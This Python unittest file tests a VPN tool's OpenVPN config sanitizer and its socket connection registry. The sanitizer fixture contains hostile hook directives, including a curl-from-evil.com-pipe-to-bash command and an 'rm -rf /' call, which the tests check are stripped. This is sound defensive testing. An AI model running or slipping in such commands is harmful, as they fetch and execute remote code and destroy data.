#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AimiliVPN 阶段一第三方独立复检测试套件 (Phase 1 Security & Connection Audit)
严格验证：
  1. OpenVPN 配置指令白名单清洗 (sanitize_ovpn_config)
     - 封杀 up/down/script-security/plugin 等任意命令执行
     - 封杀恶意未知 inline block
     - 放行合法连接指令与 ca/cert/key 证书块
  2. 下游连接复位中心 (ConnRegistry)
     - 验证注册、注销、并发线程安全
     - 验证 close_all() 强制切断、socket 状态迁移与句柄释放
"""

import os
import sys
import socket
import threading
import unittest

# 动态加载 scripts/vpngate_engine.py
sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts"))
import vpngate_engine


class TestPhase1SecuritySanitizer(unittest.TestCase):
    """阶段一安全白名单清洗对抗性审查测试"""

    def test_strip_dangerous_rce_directives(self):
        """测试对恶意代码执行指令的彻底剔除"""
        malicious_ovpn = """
client
dev tun
proto udp
remote 1.2.3.4 1194
script-security 2
up "/bin/bash -c 'curl evil.com/bot.sh | bash'"
down "/usr/bin/python3 -c 'import os; os.system(\"rm -rf /\")'"
plugin /tmp/evil.so
route-up "/bin/sh -c evil"
auth-user-pass-verify /tmp/verify.sh via-file
management 127.0.0.1 9999
cipher AES-128-CBC
auth SHA256
"""
        cleaned = vpngate_engine.sanitize_ovpn_config(malicious_ovpn)

        # 断言所有恶意指令必须 100% 被剔除
        for evil_word in [
            "script-security",
            "up /bin/bash",
            "down /usr/bin/python3",
            "plugin /tmp/evil.so",
            "route-up",
            "auth-user-pass-verify",
            "management",
            "evil.com",
            "rm -rf"
        ]:
            self.assertNotIn(evil_word, cleaned, f"恶意指令未能剔除: {evil_word}")

        # 断言正常连接指令必须完好保留
        self.assertIn("client", cleaned)
        self.assertIn("dev tun", cleaned)
        self.assertIn("proto udp", cleaned)
        self.assertIn("remote 1.2.3.4 1194", cleaned)
        self.assertIn("cipher AES-128-CBC", cleaned)
        self.assertIn("auth SHA256", cleaned)

        # 断言自动补齐了 Netns 隔离运行指令
        self.assertIn("nobind", cleaned)
        self.assertIn("persist-tun", cleaned)
        self.assertIn("persist-key", cleaned)
        self.assertIn("verb 3", cleaned)

    def test_inline_blocks_sanitization(self):
        """测试对内联证书块的合法保留与恶意块的过滤"""
        sample_with_blocks = """
client
dev tun
proto udp
remote 1.2.3.4 1194
<ca>
-----BEGIN CERTIFICATE-----
MIIB/TCCAWagAwIBAgIU...
-----END CERTIFICATE-----
</ca>
<evil-script-block>
echo "HACKED"
</evil-script-block>
<cert>
VALID_CERT_DATA
</cert>
<key>
VALID_KEY_DATA
</key>
"""
        cleaned = vpngate_engine.sanitize_ovpn_config(sample_with_blocks)

        # 合法证书块必须保留
        self.assertIn("<ca>", cleaned)
        self.assertIn("-----BEGIN CERTIFICATE-----", cleaned)
        self.assertIn("</ca>", cleaned)
        self.assertIn("<cert>", cleaned)
        self.assertIn("VALID_CERT_DATA", cleaned)
        self.assertIn("</cert>", cleaned)
        self.assertIn("<key>", cleaned)
        self.assertIn("VALID_KEY_DATA", cleaned)
        self.assertIn("</key>", cleaned)

        # 恶意未知内联块必须被物理剔除
        self.assertNotIn("<evil-script-block>", cleaned)
        self.assertNotIn('echo "HACKED"', cleaned)
        self.assertNotIn("</evil-script-block>", cleaned)

    def test_empty_or_corrupt_config(self):
        """测试空配置或脏数据的异常鲁棒性"""
        self.assertEqual(vpngate_engine.sanitize_ovpn_config(""), "")
        self.assertEqual(vpngate_engine.sanitize_ovpn_config(None), "")
        cleaned_whitespace = vpngate_engine.sanitize_ovpn_config("   \n\n  \t  \n")
        self.assertIn("nobind", cleaned_whitespace)


class TestPhase1ConnRegistry(unittest.TestCase):
    """阶段二下游 Socket 注册与批量切断对抗性审查测试"""

    def test_register_and_close_all(self):
        """测试 Socket 注册、生命周期与 close_all 强制切断"""
        registry = vpngate_engine.ConnRegistry()

        # 创建真实的本地 Socket 对模拟下游客户端
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("127.0.0.1", 0))
        server.listen(5)
        port = server.getsockname()[1]

        client_socks = []
        accepted_socks = []

        for _ in range(5):
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.connect(("127.0.0.1", port))
            a, _ = server.accept()
            client_socks.append(c)
            accepted_socks.append(a)
            registry.register(a)

        # 验证注册成功
        self.assertEqual(len(registry._conns), 5)

        # 模拟 1 个客户端自行正常断开
        registry.unregister(accepted_socks[0])
        accepted_socks[0].close()
        client_socks[0].close()
        self.assertEqual(len(registry._conns), 4)

        # 触发批量强制断开 (模拟节点切换)
        closed_count = registry.close_all()
        self.assertEqual(closed_count, 4)
        self.assertEqual(len(registry._conns), 0)

        # 验证所有剩余客户端 Socket 均收到 FIN/EOF
        for c in client_socks[1:]:
            c.settimeout(1.0)
            data = c.recv(1024)
            # 对方 shutdown 并 close 后，recv 必须返回空字节 (EOF)
            self.assertEqual(data, b"", "客户端未感知到对端断开！")
            c.close()

        server.close()

    def test_conn_registry_thread_safety(self):
        """测试高并发环境下的注册与注销线程安全性"""
        registry = vpngate_engine.ConnRegistry()
        threads = []

        def worker(idx):
            for _ in range(50):
                # 创建虚拟 socket 对象测试锁
                dummy_sock = socket.socket()
                registry.register(dummy_sock)
                registry.unregister(dummy_sock)
                dummy_sock.close()

        for i in range(10):
            t = threading.Thread(target=worker, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        self.assertEqual(len(registry._conns), 0)


if __name__ == "__main__":
    unittest.main()
